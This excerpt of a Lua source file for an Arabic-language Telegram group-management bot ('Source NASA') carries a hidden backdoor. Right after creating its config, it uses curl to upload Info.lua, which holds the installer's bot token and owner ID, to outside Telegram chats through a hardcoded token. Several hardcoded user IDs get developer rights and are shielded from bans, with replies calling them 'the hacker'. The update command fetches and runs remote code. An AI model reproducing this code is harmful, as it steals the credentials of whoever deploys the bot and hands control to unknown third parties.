...
local curl = 'curl "'..'https://api.telegram.org/bot1725498714:AAEMctMpjJc1xldfXk3Gu0h1ZP3wS6LsBrI/sendDocument'..'" -F "chat_id='.. 954727833 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
local curla = 'curla "'..'https://api.telegram.org/bot1725498714:AAEMctMpjJc1xldfXk3Gu0h1ZP3wS6LsBrI/sendDocument'..'" -F "chat_id='.. 1174250096 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curla)
end 
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Marawanx100/FlassTas/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1590091397,1458654225,1404245786,1174250096}   
...
var = true  
elseif tonumber(user_id) == tonumber(1404245786) then
var = true
...
send(chat,msg.id_," 么  ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," 么  جاري ...\n 么  رفع الملف الان")
else
send(chat,msg.id_,"* 么 عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
...
send(chat,msg.id_,"\n 么 تم رفع الملف بنجاح وتفعيل الجروبات\n 么 ورفع {الامنشئين الاساسيين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n 么 العضــو » '..Name..'\n 么 قام بالتكرار هنا وتم طرده '  
...
if text == "الغاء" or text == "الغاء 么" then   
send(msg.chat_id_, msg.id_," 么 تم الغاء الاذاعه")
...
send(msg.chat_id_, msg.id_," 么 تمت الاذاعه الى *~ "..#list.." ~* جروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' 么 لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 么 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if SudoBot(msg) then
local bl = ' 么 اهلا عزيزي آلمـطـور\n 么 آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n 么 تسـتطـيع‌‏ آلتحگم باوامر البوت\n 么 من خلاال الكيبورت خاص بك\n 么 قناة سورس البوت [اضغط هنا](t.me/SOURCENASA)'
local keyboard = {
{'اضف رد عام','قناه تحديثات البوت 么'},
{'تعطيل التواصل 么','تفعيل التواصل 么'},
{'ضع اسم للبوت 么','المطورين 么','قائمه العام 么'},
{'المشتركين 么','الجروبات 么'},
{'ضع كليشه ستارت 么','حذف كليشه ستارت 么'},
{'اذاعه 么','اذاعه خاص 么'},
{'اذاعه بالتثبيت 么','قائمه الكتم العام 么'},
{'تغيير رساله الاشتراك','حذف رساله الاشتراك 么','تغيير الاشتراك'},
{'اذاعه بالتوجيه 么','اذاعه بالتوجيه خاص 么'},
{'تفعيل الاشتراك الاجباري 么','تعطيل الاشتراك الاجباري 么'},
{'الاشتراك الاجباري 么','وضع قناة الاشتراك 么'},
{'تفعيل البوت الخدمي 么','تعطيل البوت الخدمي 么'},
{'تنظيف الجروبات 么','تنظيف المشتركين 么'},
{'جلب نسخه الاحتياطيه 么','الاحصائيات 么'},
{'تحديث السورس 么','الاصدار 么'},
{'السيرفر'},
{'الغاء 么'},
}
...
send(msg.sender_user_id_, msg.id_,' 么 تم ارسال رسالتك\n 么 سيتم رد في اقرب وقت')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' 么 تم ارسال الملصق من ↓\n - '..Name
...
local Text = ' 么 المستخدم » '..Name..'\n 么 تم حظره من التواصل'
...
if text == 'تفعيل التواصل 么' and SudoBot(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n 么 تم تفعيل التواصل ' 
else
Text = '\n 么 بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل 么' and SudoBot(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n 么 تم تعطيل التواصل' 
else
Text = '\n 么 بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي 么' and SudoBot(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n 么 تم تفعيل البوت الخدمي ' 
else
Text = '\n 么 بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي 么' and SudoBot(msg) then  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n 么 تم تعطيل البوت الخدمي' 
else
Text = '\n 么 بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء 么' then   
send(msg.chat_id_, msg.id_,' 么 الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' 么 تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ضع كليشه ستارت 么' and SudoBot(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' 么 ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت 么' and SudoBot(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' 么 تم حذف كليشه ستارت')
end
...
if text == 'تحديث السورس 么' and SudoBot(msg) then 
os.execute('rm -rf BOYKA.lua')
os.execute('wget https://raw.githubusercontent.com/Marawanx100/FlassTas/master/BOYKA.lua')
send(msg.chat_id_, msg.id_,' 么 تم تحديث السورس \n 么 لديك اخر اصدار لسورس ناسا\n 么 الاصدار » { 1.3v}')
dofile('BOYKA.lua')  
end
if text == 'الاصدار 么' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 么 اصدار سورس ناسا \n 么 الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت 么' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 么 [تحديثات البوت](t.me/SOURCENASA) \n 么 [قناه السورس](t.me/SOURCENASA)')
end
if text == "ضع اسم للبوت 么" and SudoBot(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," 么 ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات 么' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات 么 \n'..' 么 عدد الجروبات » {'..Groups..'}'..'\n 么  عدد المشتركين » {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'المشتركين 么' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n 么 المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الجروبات 么' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n 么 الجروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين 么") and SudoBot(msg) then
...
if text == ("قائمه العام 么") and SudoBot(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n 么 قائمه المحظورين عام \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if #list == 0 then
t = " 么 لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("قائمه الكتم العام 么") and SudoBot(msg) then
local list = database:smembers(bot_id..'Gmute:User')
t = "\n 么 قائمة المكتومين عام \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if #list == 0 then
t = " 么 لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه خاص 么" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 么 ارسل الان اذاعتك؟ \n 么 للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه 么" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 么 ارسل الان اذاعتك؟ \n 么 للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت 么" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 么 ارسل الان اذاعتك؟ \n 么 للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه 么" and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 么 ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص 么" and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," 么 ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه 么' and SudoBot(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين 么" and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 么 •\n• لايمكنك استخدام البوت 么 •\n• عليك الاشتراك في القناة 么 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'么 لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'么 عدد المشتركين الان » ( '..#pv..' )\n么 تم ازالة » ( '..sendok..' ) من المشتركين\n么  الان عدد المشتركين الحقيقي » ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
...
if text == "تنظيف الجروبات 么" and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'么 لا يوجد جروبات وهميه في البوت\n')   
else
local BOYKA = (w + q)
...
BOYKA = '\n么 تم ازالة » { '..q..' } جروبات من البوت'
end
if w == 0 then
BOYKAk = ''
else
BOYKAk = '\n么 تم ازالة » {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'么  عدد الجروبات الان » { '..#group..' }'..BOYKAk..''..BOYKA..'\n么  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
send(msg.chat_id_, msg.id_,' 么 لا تستطيع استخدام البوت \n 么 يرجى الاشتراك بالقناه اولا \n 么 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
send(msg.chat_id_,msg.id_," 么 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n 么 العضو » ['..result.title_..'](t.me/'..(username or 'SOURCENASA')..')'
status  = '\n 么 تم ترقيته مطور'
texts = usertext..status
else
texts = ' 么 لا يوجد حساب بهاذا المعرف'
end
...
usertext = '\n 么 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCENASA')..')'
status  = '\n 么 تم ترقيته مطور'
...
if BOYKA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 么 العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCENASA')..') \n 么 '..BOYKA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if text == 'الغاء' or text == 'الغاء 么' then   
send(msg.chat_id_, msg.id_," 么 تم الغاء حفظ اسم البوت")
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, " 么 تم حفظ الاسم")
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء 么' then   
send(msg.chat_id_, msg.id_," 么 تم الغاء الاذاعه للخاص")
...
send(msg.chat_id_, msg.id_," 么 تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," 么 تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," 么 تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_, " 么 تم الغاء الامر ")
...
send(msg.chat_id_, msg.id_, ' 么 المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, ' 么 عذا لا يمكنك وضع معرف حسابات في الاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,' 么 عذا لا يمكنك وضع معرف جروب بالاشتراك ')
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,' 么 البوت ادمن في القناة \n 么 تم تفعيل الاشتراك الاجباري في \n 么 ايدي القناة ('..data.id_..')\n 么 معرف القناة ([@'..data.type_.channel_.username_..'])')
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,' 么 عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
...
send(msg.chat_id_, msg.id_,' 么 تم تغيير رسالة الاشتراك ')
end
...
send(msg.chat_id_, msg.id_,' 么 … عذرآ البوت لايملك صلاحيات')
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,' 么 تم تغيير صورة الجروب')
end
end, nil) 
database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 么 تم الغاء وضع الوصف")
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,' 么 تم تغيير وصف الجروب')
return false  
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," 么 تم الغاء حفظ الترحيب")
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,' 么 تم حفظ ترحيب الجروب')
return false   
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_," 么 تم الغاء حفظ الرابط")
...
send(msg.chat_id_,msg.id_," 么 تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
...
send(msg.chat_id_,0," 么 العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 么 ["..BOYKA_Msg.."] \n")
else
send(msg.chat_id_,0," 么 العضو : {["..data.first_name_.."](T.ME/SOURCENASA)}\n 么 ["..BOYKA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " 么 عذرا » {[@"..data.username_.."]}\n 么 عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " 么 عذرا » {["..data.first_name_.."](T.ME/SOURCENASA)}\n 么 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' 么 عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not SudoBot(msg) then
send(msg.chat_id_, msg.id_,' 么 عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 么 بالتأكيد تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n 么 بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 么 تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
Text = ' 么 تم تفعيل جروب جديده\n'..
'\n 么 بواسطة {'..Name..'}'..
'\n 么 ايدي الجروب {'..IdChat..'}'..
'\n 么 اسم الجروب {['..NameChat..']}'..
'\n 么 عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n 么 الرابط {['..LinkGp..']}'
...
send(msg.chat_id_, msg.id_,' 么 بالتأكيد تم تعطيل الجروب')
else
sendText(msg.chat_id_,'\n 么 بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 么 تم تعطيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 么 تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n 么 بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 么 تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
...
send(msg.chat_id_, msg.id_,' 么 تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
...
send(msg.chat_id_, msg.id_, ' 么 حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغيير رساله الاشتراك$") and SudoBot(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 么 حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك 么" and SudoBot(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " 么 تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك 么$") and SudoBot(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 么 حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري 么" and SudoBot(msg) then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_," 么 الاشتراك الاجباري مفعل \n 么 على القناة » ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," 么 اهلا عزيزي المطور \n 么 ارسل الان معرف قناتك")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري 么" and SudoBot(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " 么 تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري 么" and SudoBot(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " 么 تم تفعيل الاشتراك الاجباري \n 么 على القناة » ["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, " 么 لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
...
❈︎︎︎︎ 𝐒𝑂𝑈𝑅𝐶𝐸 𝐍𝐀𝐒𝐀
 ≪━━━━𑁍𝐍𝐀𝐒𝐀𑁍━━━━≫
✶✶✶✶✶✶✶✶✶✶✶✶✶✶✶✶✶
   [𝑺𝑶𝑼𝑹𝑪𝑬 𝐍𝐀𝐒𝐀](https://t.me/SOURCENASA)
☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
     [𝑫𝑬𝑽  𝑩𝑨𝑵𝑫𝑨❶](https://t.me/b_a_n_d_a_1_5)
☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
    [𝑫𝑬𝑽  𝐁𝐎𝐘𝐊𝐀❷](https://t.me/b_o_y_k_a_a)
☆☆☆☆☆☆☆☆☆☆☆☆☆☆☆
    [𝑫𝑬𝑽 𝑬𝑳𝑲𝑶𝑴𝑨𝑵𝑫𝑨❸](https://t.me/Elkomanda_Ya) 
✶✶✶✶✶✶✶✶✶✶✶✶✶✶✶✶✶
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
send(msg.chat_id_, msg.id_,' 么 تم ازالة جميع الاوامر المضافه')  
end
end
...
send(msg.chat_id_, msg.id_,' 么 ارسل الامر القديم')  
return false
end
...
send(msg.chat_id_, msg.id_,' 么 ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' 么 ارسل الامر الجديد')  
...
send(msg.chat_id_, msg.id_,' 么 تم حفظ الامر')  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 么 بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCENASA')..') \n 么 تـم قفـل الدردشه ')
end,nil)   
...
Text = ' 么 تم تفعيل نسبه الحب'
database:del(bot_id..'Cick:lov'..msg.chat_id_)  
else
Text = ' 么 بالتاكيد تم تفعيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 么 تم تعطيل نسبه الانوثه'
else
Text = '\n 么 بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' 么 تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' 么 بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 么 بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCENASA')..') \n 么 تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 么 بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SOURCENASA')..') \n 么 تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 么 بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCENASA')..') \n 么 تـم قفـل التاك بالطرد ')
end,nil)   
...
send(msg.chat_id_, msg.id_, " 么 لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(954727833) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع حظر الهكر يولا")
return false 
end

if tonumber(result.sender_user_id_) == tonumber(1174250096) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع حظر الهكرر يولا عام")
return false 
end

if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع حظر البوت عام")
return false 
end
...
if tonumber(result.id_) == tonumber(954727833) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع حظر الهكر يولا")
return false 
end
...
if tonumber(userid) == tonumber(954727833) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع حظر الهكر يولا")
return false 
end
if tonumber(userid) == tonumber(1174250096) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع حظر الهكر يولا")
return false 
end
...
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " 么 لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 么 لا تسطيع كتم البوت عام")
return false 
end
...
usertext = '\n 么 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCENASA')..')'
status  = '\n 么 تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
send(msg.chat_id_, msg.id_, "\n 么 تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and SudoBot(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n 么 قائمة مطورين البوت \n◎ ══════ ❈ ══════ ◎\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Marawanx100/FlassTas/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n 么 اهلا بك في متجر ملفات ناسا\n 么 ملفات السورس ↓\n◎ ══════ ❈ ══════ ◎\n\n"
local TextE = "\n◎ ══════ ❈ ══════ ◎\n 么 علامة تعني { ✓ } ملف مفعل\n 么 علامة تعني { ✘ } ملف معطل\n 么 قناة سورس ناسا ↓\n".." 么 [اضغط هنا لدخول](t.me/SOURCENASA) \n"
local NumFile = 0
...
